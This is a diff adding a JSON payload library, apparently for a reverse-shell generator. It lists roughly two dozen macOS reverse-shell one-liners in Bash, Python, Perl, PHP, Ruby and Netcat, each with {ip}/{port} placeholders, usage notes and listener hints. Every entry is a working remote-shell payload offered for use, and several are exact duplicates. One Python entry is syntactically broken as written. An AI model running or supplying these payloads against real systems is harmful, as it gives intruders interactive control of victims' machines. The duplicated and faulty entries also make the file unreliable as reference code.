@@ -1,0 +1,311 @@
+{
+    "payloads": [
+        {
+            "os": "macOS",
+            "language": "Bash",
+            "description": "Simple Bash reverse shell using /dev/tcp.",
+            "template": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
+            "usage": "Run on macOS terminal. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "bash",
+                "one-liner",
+                "interactive"
+            ]
+        },
+        {
+            "os": "macOS",
+            "language": "Python",
+            "description": "Python reverse shell using socket and subprocess modules.",
+            "template": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
+            "usage": "Requires Python3 installed. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "python",
+                "interactive"
+            ]
+        },
+        {
+            "os": "macOS",
+            "language": "Perl",
+            "description": "Perl reverse shell using socket and exec.",
+            "template": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'",
+            "usage": "Requires Perl installed. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "perl",
+                "interactive"
+            ]
+        },
+        {
+            "os": "macOS",
+            "language": "PHP",
+            "description": "PHP reverse shell using fsockopen and exec.",
+            "template": "<?php $sock=fsockopen('{ip}',{port});exec('/bin/bash -i <&3 >&3 2>&3'); ?>",
+            "usage": "Run in PHP environment on macOS. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "php",
+                "interactive"
+            ]
+        },
+        {
+            "os": "macOS",
+            "language": "Ruby",
+            "description": "Ruby reverse shell using socket and exec.",
+            "template": "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'",
+            "usage": "Requires Ruby installed. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "ruby",
+                "interactive"
+            ]
+        },
+        {
+            "os": "macOS",
+            "language": "Netcat",
+            "description": "Netcat reverse shell using /bin/bash.",
+            "template": "nc -e /bin/bash {ip} {port}",
+            "usage": "Run on macOS with netcat supporting -e. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "netcat",
+                "interactive"
+            ]
+        },
+        {
+            "os": "macOS",
+            "language": "Netcat",
+            "description": "Netcat reverse shell using mkfifo for systems without -e option.",
+            "template": "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc {ip} {port} > /tmp/f",
+            "usage": "Works with netcat without -e support. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "netcat",
+                "fifo",
+                "interactive"
+            ]
+        },
+        {
+            "os": "macOS",
+            "language": "Bash",
+            "description": "Bash reverse shell with TCP socket and /bin/bash.",
+            "template": "0<&196;exec 196<>/dev/tcp/{ip}/{port}; /bin/bash <&196 >&196 2>&196",
+            "usage": "Run on macOS terminal. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "bash",
+                "interactive"
+            ]
+        },
+        {
+            "os": "macOS",
+            "language": "Python",
+            "description": "Python reverse shell with socket and pty for TTY allocation.",
+            "template": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
+            "usage": "Requires Python3 installed. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "python",
+                "pty",
+                "interactive"
+            ]
+        },
+        {
+            "os": "macOS",
+            "language": "Bash",
+            "description": "Bash reverse shell with exec to /bin/bash and TCP socket.",
+            "template": "exec 5<>/dev/tcp/{ip}/{port}; cat <&5 | while read line; do $line 2>&5 >&5; done",
+            "usage": "Run on macOS terminal. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "bash",
+                "interactive"
+            ]
+        },
+        {
+            "os": "macOS",
+            "language": "PHP",
+            "description": "PHP reverse shell using proc_open for interactive session.",
+            "template": "<?php $process=proc_open('/bin/bash', array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w')), $pipes); $sock=fsockopen('{ip}',{port}); while(!feof($sock)) { fwrite($pipes[0], fread($sock,1024)); fwrite($sock, fread($pipes[1],1024)); } fclose($sock); proc_close($process); ?>",
+            "usage": "Run in PHP environment. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "php",
+                "interactive"
+            ]
+        },
+        {
+            "os": "macOS",
+            "language": "Python",
+            "description": "Python reverse shell with socket and subprocess in one line.",
+            "template": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/bash\",\"-i\"])'",
+            "usage": "Requires Python3 installed. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "python",
+                "interactive",
+                "one-liner"
+            ]
+        },
+        {
+            "os": "macOS",
+            "language": "Bash",
+            "description": "Bash reverse shell using /dev/tcp and /bin/bash.",
+            "template": "0</dev/tcp/{ip}/{port} | /bin/bash >&0 2>&0",
+            "usage": "Run on macOS terminal. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "bash",
+                "interactive"
+            ]
+        },
+        {
+            "os": "macOS",
+            "language": "Perl",
+            "description": "Perl reverse shell using socket and system call.",
+            "template": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");system(\"/bin/bash -i\");};'",
+            "usage": "Requires Perl installed. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "perl",
+                "interactive"
+            ]
+        },
+        {
+            "os": "macOS",
+            "language": "Ruby",
+            "description": "Ruby reverse shell using socket and system call with fork.",
+            "template": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{ip}\",{port});loop{cmd=c.gets;break if cmd.nil?;IO.popen(cmd,\"r\"){|io|c.print io.read}}'",
+            "usage": "Requires Ruby installed. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "ruby",
+                "interactive"
+            ]
+        },
+        {
+            "os": "macOS",
+            "language": "Netcat",
+            "description": "Netcat reverse shell with bash fallback.",
+            "template": "nc -c /bin/bash {ip} {port}",
+            "usage": "Run on macOS with netcat supporting -c. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "netcat",
+                "bash",
+                "interactive"
+            ]
+        },
+        {
+            "os": "macOS",
+            "language": "Bash",
+            "description": "Bash reverse shell with exec and TCP socket.",
+            "template": "exec 5<>/dev/tcp/{ip}/{port}; cat <&5 | while read line; do $line 2>&5 >&5; done",
+            "usage": "Run on macOS terminal. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "bash",
+                "interactive"
+            ]
+        },
+        {
+            "os": "macOS",
+            "language": "Python",
+            "description": "Python reverse shell with socket and pty.spawn for TTY.",
+            "template": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
+            "usage": "Requires Python3 installed. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "python",
+                "pty",
+                "interactive"
+            ]
+        },
+        {
+            "os": "macOS",
+            "language": "PHP",
+            "description": "PHP reverse shell using shell_exec and fsockopen.",
+            "template": "<?php $sock=fsockopen('{ip}',{port});while($cmd=fgets($sock)){echo shell_exec($cmd);}?>",
+            "usage": "Run in PHP environment. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "php",
+                "interactive"
+            ]
+        },
+        {
+            "os": "macOS",
+            "language": "Perl",
+            "description": "Perl reverse shell using socket and system call.",
+            "template": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");system(\"/bin/bash -i\");};'",
+            "usage": "Requires Perl installed. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "perl",
+                "interactive"
+            ]
+        },
+        {
+            "os": "macOS",
+            "language": "Ruby",
+            "description": "Ruby reverse shell with socket and exec.",
+            "template": "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'",
+            "usage": "Requires Ruby installed. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "ruby",
+                "interactive"
+            ]
+        },
+        {
+            "os": "macOS",
+            "language": "Netcat",
+            "description": "Netcat reverse shell with mkfifo for systems without -e option.",
+            "template": "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc {ip} {port} > /tmp/f",
+            "usage": "Works with netcat without -e support. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "netcat",
+                "fifo",
+                "interactive"
+            ]
+        },
+        {
+            "os": "macOS",
+            "language": "Bash",
+            "description": "Bash reverse shell with TCP socket and /bin/bash.",
+            "template": "0<&196;exec 196<>/dev/tcp/{ip}/{port}; /bin/bash <&196 >&196 2>&196",
+            "usage": "Run on macOS terminal. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "bash",
+                "interactive"
+            ]
+        },
+        {
+            "os": "macOS",
+            "language": "Python",
+            "description": "Python reverse shell with socket, subprocess, and select.",
+            "template": "python3 -c 'import socket,subprocess,select;s=socket.socket();s.connect((\"{ip}\",{port}));while True:r,w,e=select.select([s],[],[]);if s in r:data=s.recv(1024).decode();proc=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE);out=proc.stdout.read()+proc.stderr.read();s.send(out)'",
+            "usage": "Requires Python3 installed. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "python",
+                "interactive"
+            ]
+        },
+        {
+            "os": "macOS",
+            "language": "Bash",
+            "description": "Bash reverse shell with exec and TCP socket.",
+            "template": "exec 5<>/dev/tcp/{ip}/{port}; cat <&5 | while read line; do $line 2>&5 >&5; done",
+            "usage": "Run on macOS terminal. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "bash",
+                "interactive"
+            ]
+        }
+    ]
+}
